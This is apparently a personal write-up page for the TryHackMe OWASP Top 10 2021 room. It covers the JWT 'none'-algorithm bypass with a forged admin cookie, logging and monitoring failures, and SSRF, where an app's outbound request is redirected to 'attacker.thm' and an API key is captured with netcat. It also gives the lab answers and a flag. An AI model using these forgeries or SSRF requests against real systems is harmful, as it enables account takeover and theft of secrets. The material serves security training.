+<h3 id="jwt-and-the-none-algorithm">JWT and the None Algorithm</h3>
+
+<ul>
+  <li>A data integrity failure vulnerability was present on some libraries implementing JWTs a while ago.</li>
+  <li>The vulnerable libraries allowed attackers to bypass the signature validation by changing the two following things in a JWT:</li>
+</ul>
+
+<ol>
+  <li>Modify the header section of the token so that the <code class="language-plaintext highlighter-rouge">alg</code> header would contain the value <code class="language-plaintext highlighter-rouge">none</code>.</li>
+  <li>Remove the signature part.</li>
+</ol>
+
+<ul>
+  <li>Taking the JWT from before as an example, if we wanted to change the payload so that the username becomes “admin” and no signature check is done, we would have to decode the header and payload, modify them as needed, and encode them back.</li>
+  <li>Notice how we removed the signature part but kept the dot at the end.</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/f5d1b4ef49ff4eef52e7617631225e8a.png" alt="JWT None Algorithm" /></p>
+
+<h3 id="questions-8">Questions</h3>
+
+<p>Try logging into the application as guest. What is guest’s account password?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926094429.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: guest`
+</code></pre></div></div>
+
+<p>What is the name of the website’s cookie containing a JWT token?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926095143.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: jwt-session`
+</code></pre></div></div>
+
+<p>What is the flag presented to the admin user?</p>
+
+<ul>
+  <li>First base64 decode the cookie to get the JWT token’s data.</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926095430.png" alt="" /></p>
+
+<ul>
+  <li>Then encode the first two parts <em>separately</em> with the changes mentioned above:
+    <ul>
+      <li>change <strong>alg</strong> to <strong>none</strong></li>
+      <li>change <strong>username</strong> to <strong>guest</strong></li>
+    </ul>
+  </li>
+  <li>Then append the two encoding with the dot in between them, making sure to also add a dot at the very end</li>
+  <li>The resulting cookie value would be:</li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzI3MzM5NDc0fQ==.</code></p>
+  </li>
+  <li>Paste this in the cookie value column and refresh the page</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926101223.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: THM{Dont_take_cookies_from_strangers}`
+</code></pre></div></div>
+
+<h2 id="security-logging-and-monitoring-failures">Security Logging and Monitoring Failures</h2>
+
+<ul>
+  <li>When web applications are set up, every action performed by the user should be logged.
+    <ul>
+      <li>Logging is important because, in the event of an incident, the attackers’ activities can be traced.</li>
+    </ul>
+  </li>
+  <li>Once their actions are traced, their risk and impact can be determined.</li>
+  <li>Without logging, there would be no way to tell what actions were performed by an attacker if they gain access to particular web applications.</li>
+  <li>The more significant impacts of these include:
+    <ul>
+      <li><strong>Regulatory damage:</strong> 
+        <ul>
+          <li>if an attacker has gained access to personally identifiable user information and there is no record of this, final users are affected, and the application owners may be subject to fines or more severe actions depending on regulations.</li>
+        </ul>
+      </li>
+      <li><strong>Risk of further attacks:</strong> 
+        <ul>
+          <li>an attacker’s presence may be undetected without logging.</li>
+          <li>This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li>The information stored in logs should include the following:
+    <ul>
+      <li>HTTP status codes</li>
+      <li>Time Stamps</li>
+      <li>Usernames</li>
+      <li>API endpoints/page locations</li>
+      <li>IP addresses</li>
+    </ul>
+  </li>
+  <li>
+    <p>These logs have some sensitive information, so it’s important to ensure that they are stored securely and that multiple copies of these logs are stored at different locations.</p>
+  </li>
+  <li>
+    <p>Common examples of suspicious activity include:</p>
+
+    <ul>
+      <li><strong>Multiple unauthorised attempts for a particular action</strong> (usually authentication attempts or access to unauthorised resources, e.g. admin pages)</li>
+      <li><strong>Requests from anomalous IP addresses or locations</strong>: while this can indicate that someone else is trying to access a particular user’s account, it can also have a false positive rate.</li>
+      <li><strong>Use of automated tools</strong>: particular automated tooling can be easily identifiable, e.g. using the value of User-Agent headers or the speed of requests.</li>
+      <li><strong>Common payloads</strong>: in web applications, it’s common for attackers to use known payloads.
+        <ul>
+          <li>Detecting the use of these payloads can indicate the presence of someone conducting unauthorised/malicious testing on applications.</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-9">Questions</h3>
+
+<p>What IP address is the attacker using?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926101754.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: 49.99.13.16`
+</code></pre></div></div>
+
+<p>What kind of attack is being carried out?</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: Brute Force`
+</code></pre></div></div>
+
+<h2 id="10-server-side-request-forgery-ssrf">10. Server-Side Request Forgery (SSRF)</h2>
+
+<ul>
+  <li>This type of vulnerability occurs when an attacker can coerce a web application into sending requests on their behalf to arbitrary destinations while having control of the contents of the request itself. </li>
+  <li>
+    <p>SSRF vulnerabilities often arise from implementations where our web application needs to use third-party services.</p>
+  </li>
+  <li>Think, for example, of a web application that uses an external API to send SMS notifications to its clients.</li>
+  <li>For each email, the website needs to make a web request to the SMS provider’s server to send the content of the message to be sent.
+    <ul>
+      <li>Since the SMS provider charges per message, they require you to add a secret key, which they pre-assign to you, to each request you make to their API.</li>
+    </ul>
+  </li>
+  <li>The API key serves as an authentication token and allows the provider to know to whom to bill each message.</li>
+  <li>The application would work like this:</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/271d0075650cdf6499f994f99fa7eb8a.png" alt="SSRF" /></p>
+
+<ul>
+  <li>By looking at the diagram above, it is easy to see where the vulnerability lies.</li>
+  <li>The application exposes the <code class="language-plaintext highlighter-rouge">server</code> parameter to the users, which defines the server name of the SMS service provider.</li>
+  <li>If the attacker wanted, they could simply change the value of the <code class="language-plaintext highlighter-rouge">server</code> to point to a machine they control, and your web application would happily forward the SMS request to the attacker instead of the SMS provider.</li>
+  <li>As part of the forwarded message, the attacker would obtain the API key, allowing them to use the SMS service to send messages at your expense.</li>
+  <li>To achieve this, the attacker would only need to make the following request to your website:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC</code></p>
+
+<ul>
+  <li>This would make the vulnerable web application make a request to:</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">https://attacker.thm/api/send?msg=ABC</code> </p>
+
+<ul>
+  <li>You could then just capture the contents of the request using Netcat:</li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926102543.png" alt="" /></p>
+
+<ul>
+  <li> SSRF can be used for:
+    <ul>
+      <li>Enumerate internal networks, including IP addresses and ports.</li>
+      <li>Abuse trust relationships between servers and gain access to otherwise restricted services.</li>
+      <li>Interact with some non-HTTP services to get remote code execution (RCE).</li>
+    </ul>
+  </li>
+</ul>
+
+<h3 id="questions-10">Questions</h3>
+
+<p>Explore the website. What is the only host allowed to access the admin area?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926102713.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: localhost`
+</code></pre></div></div>
+
+<p>Check the “Download Resume” button. Where does the server parameter point to?</p>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926102815.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: secure-file-storage.com`
+</code></pre></div></div>
+
+<p>Using SSRF, make the application send the request to your AttackBox instead of the secure file storage. Are there any API keys in the intercepted request?</p>
+
+<ul>
+  <li>
+    <p>use netcat to listen to a port on your machine, for e.g. 80 using <code class="language-plaintext highlighter-rouge">nc -lvp 80</code></p>
+  </li>
+  <li>
+    <p>make a request to <code class="language-plaintext highlighter-rouge">http://10.10.179.223:8087/download?server=&lt;your_ip&gt;:&lt;your_port&gt;&amp;id=75482342</code></p>
+  </li>
+</ul>
+
+<p><img src="/tryhackme/OWASP%20Top%2010%20-%202021/Pasted%20image%2020240926103247.png" alt="" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`A: `
+</code></pre></div></div>
+
+        </article>
+
+        <!-- Back button -->
+        <div class="writeup-footer-nav">
+          <a href="/tryhackme/" class="btn-ghost">← Back to Index</a>
+        </div>
+      </div>
+
+    </div><!-- /.writeup-body -->
+
+  </div>
+</main>
+
+<!-- Floating ToC toggle (shown when sidebar is hidden) -->
+<button class="toc-fab" id="tocFab" aria-label="Open table of contents" style="display:none;">
+  ☰ <span>ToC</span>
+</button>
+
+<script>
+(function () {
+  const sidebar  = document.getElementById('tocSidebar');
+  const tocNav   = document.getElementById('tocNav');
+  const toggleBtn = document.getElementById('tocToggle');
+  const fab      = document.getElementById('tocFab');
+  const content  = document.getElementById('writeupContent');
+
+  /* ── Build ToC from headings ── */
+  const headings = Array.from(content.querySelectorAll('h2, h3'));
+
+  if (headings.length === 0) {
+    // leave the "No headings" placeholder
+  } else {
+    tocNav.innerHTML = '';
+    headings.forEach((h, i) => {
+      // Ensure every heading has an id we can link to
+      if (!h.id) {
+        h.id = 'toc-heading-' + i + '-' + h.textContent.trim()
+                .toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/^-|-$/g, '');
+      }
+      const a = document.createElement('a');
+      a.href = '#' + h.id;
+      a.textContent = h.textContent;
+      a.className = 'toc-link toc-' + h.tagName.toLowerCase();
+      a.addEventListener('click', function (e) {
+        e.preventDefault();
+        document.getElementById(h.id).scrollIntoView({ behavior: 'smooth', block: 'start' });
+        // on mobile, close after click
+        if (window.innerWidth < 1024) hideSidebar();
+      });
+      tocNav.appendChild(a);
+    });
+  }
+
+  /* ── Highlight active heading on scroll ── */
+  const observer = new IntersectionObserver(entries => {
+    entries.forEach(entry => {
+      const link = tocNav.querySelector('a[href="#' + entry.target.id + '"]');
+      if (!link) return;
+      if (entry.isIntersecting) {
+        tocNav.querySelectorAll('.toc-link').forEach(l => l.classList.remove('active'));
+        link.classList.add('active');
+      }
+    });
+  }, { rootMargin: '-60px 0px -70% 0px', threshold: 0 });
+
+  headings.forEach(h => observer.observe(h));
+
+  /* ── Show / hide ── */
+  function showSidebar() {
+    sidebar.classList.add('open');
+    sidebar.setAttribute('aria-hidden', 'false');
+    fab.style.display = 'none';
+    localStorage.setItem('tocOpen', '1');
+  }
+  function hideSidebar() {
+    sidebar.classList.remove('open');
+    sidebar.setAttribute('aria-hidden', 'true');
+    fab.style.display = 'flex';
+    localStorage.setItem('tocOpen', '0');
+  }
+
+  toggleBtn.addEventListener('click', hideSidebar);
+  fab.addEventListener('click', showSidebar);
+
+  /* ── Restore preference ── */
+  const isMobile = () => window.innerWidth < 1024;
+  const pref = localStorage.getItem('tocOpen');
+
+  if (isMobile()) {
+    hideSidebar();
+  } else if (pref === '0') {
+    hideSidebar();
+  } else {
+    showSidebar();
+  }
+
+  window.addEventListener('resize', () => {
+    if (isMobile()) {
+      hideSidebar();
+    } else if (localStorage.getItem('tocOpen') !== '0') {
+      showSidebar();
+    }
+  });
+})();
+</script>
+
+<script>
+/* ── Q&A Card Builder ── */
+(function () {
+  const article = document.getElementById('writeupContent');
+  if (!article) return;
+
+  // Mark "Questions" h3 headings
+  article.querySelectorAll('h3').forEach(h => {
+    if (h.textContent.trim().toLowerCase() === 'questions') {
+      h.classList.add('is-questions');
+    }
+  });
+
+  /*
+    Algorithm:
+    - Take a live snapshot of direct children
+    - Scan forward; when we see a <p> starting with "Q:", enter collection mode
+    - Collect all nodes into `questionNodes` until we hit a <p> starting with "A:"
+    - Collect `answerNodes` from "A:" until the next Q:, heading, or end
+    - Build a .qa-block and splice it in place of those nodes
+  */
+
+  function startsWithQ(el) {
+    return el.tagName === 'P' && /^Q:/i.test(el.textContent.trim());
+  }
+  function startsWithA(el) {
+    return el.tagName === 'P' && /^A:/i.test(el.textContent.trim());
+  }
+  function isHeading(el) {
+    return /^H[1-6]$/.test(el.tagName);
+  }
+
+  function buildCard(questionNodes, answerPara, answerNodes) {
+    const block = document.createElement('div');
+    block.className = 'qa-block';
+
+    /* ── Question ── */
+    const qRow = document.createElement('div');
+    qRow.className = 'qa-question';
+
+    const qBadge = document.createElement('span');
+    qBadge.className = 'qa-q-badge';
+    qBadge.textContent = 'Q';
+    qRow.appendChild(qBadge);
+
+    const qBody = document.createElement('div');
+    qBody.className = 'qa-question-body';
+
+    // First node is the Q: paragraph — strip the prefix, use its innerHTML
+    const qPara = questionNodes[0];
+    qBody.innerHTML = qPara.innerHTML.replace(/^Q:\s*/i, '');
+
+    // Remaining question nodes (walkthrough: images, code, prose)
+    questionNodes.slice(1).forEach(n => qBody.appendChild(n.cloneNode(true)));
+
+    qRow.appendChild(qBody);
+    block.appendChild(qRow);
+
+    /* ── Reveal button ── */
+    const btn = document.createElement('button');
+    btn.className = 'qa-reveal-btn';
+    btn.innerHTML = '<span class="qa-chevron">▼</span><span>reveal answer</span>';
+    block.appendChild(btn);
+
+    /* ── Answer ── */
+    const aPanel = document.createElement('div');
+    aPanel.className = 'qa-answer';
+
+    const aBadge = document.createElement('span');
+    aBadge.className = 'qa-a-badge';
+    aBadge.textContent = 'A';
+    aPanel.appendChild(aBadge);
+
+    const aBody = document.createElement('div');
+    aBody.className = 'qa-answer-body';
+
+    if (answerPara) {
+      // Strip "A:" prefix from the answer paragraph
+      const stripped = answerPara.innerHTML.replace(/^A:\s*/i, '').trim();
+      if (stripped) aBody.innerHTML = stripped;
+      // Trailing images / code
+      answerNodes.forEach(n => aBody.appendChild(n.cloneNode(true)));
+    } else {
+      aBody.innerHTML = '<em style="color:var(--text-dim)">—</em>';
+    }
+
+    aPanel.appendChild(aBody);
+    block.appendChild(aPanel);
+
+    /* ── Toggle ── */
+    btn.addEventListener('click', () => {
+      const isOpen = aPanel.classList.toggle('open');
+      btn.classList.toggle('open', isOpen);
+      btn.querySelector('span:last-child').textContent = isOpen ? 'hide answer' : 'reveal answer';
+    });
+
+    return block;
+  }
+
+  // Work on a snapshot so DOM mutations don't affect iteration
+  let children = Array.from(article.children);
+  let i = 0;
+
+  while (i < children.length) {
+    const el = children[i];
+
+    if (startsWithQ(el)) {
+      const questionNodes = [el]; // first node = Q: paragraph
+      let j = i + 1;
+
+      // Absorb everything until we hit A: or a heading or end
+      while (j < children.length && !startsWithA(children[j]) && !isHeading(children[j])) {
+        // Stop if we hit another Q: (back-to-back questions)
+        if (startsWithQ(children[j])) break;
+        questionNodes.push(children[j]);
+        j++;
+      }
+
+      let answerPara = null;
+      const answerNodes = [];
+
+      if (j < children.length && startsWithA(children[j])) {
+        answerPara = children[j];
+        j++;
+        // Absorb trailing images/code/blockquotes as part of answer
+        while (j < children.length &&
+               !startsWithQ(children[j]) &&
+               !startsWithA(children[j]) &&
+               !isHeading(children[j])) {
+          answerNodes.push(children[j]);
+          j++;
+        }
+      }
+
+      // Build card
+      const card = buildCard(questionNodes, answerPara, answerNodes);
+
+      // Insert before the first consumed node
+      article.insertBefore(card, el);
+
+      // Remove all consumed original nodes
+      [...questionNodes, ...(answerPara ? [answerPara] : []), ...answerNodes]
+        .forEach(n => { if (n.parentNode === article) article.removeChild(n); });
+
+      // Refresh snapshot after DOM mutation
+      children = Array.from(article.children);
+      // Find where the card landed and continue from there
+      i = children.indexOf(card) + 1;
+    } else {
+      i++;
+    }
+  }
+})();
+</script>
+
+<footer class="site-footer">
+  <div class="footer-inner">
+    <span class="footer-text"><span class="prompt">george@kali:~$</span> echo "George Nădejde · TryHackMe Writeups"</span>
+    <div class="footer-links">
+      <a href="https://georgenadejde.github.io" target="_blank" rel="noopener noreferrer">Portfolio</a>
+      <a href="https://github.com/georgenadejde" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
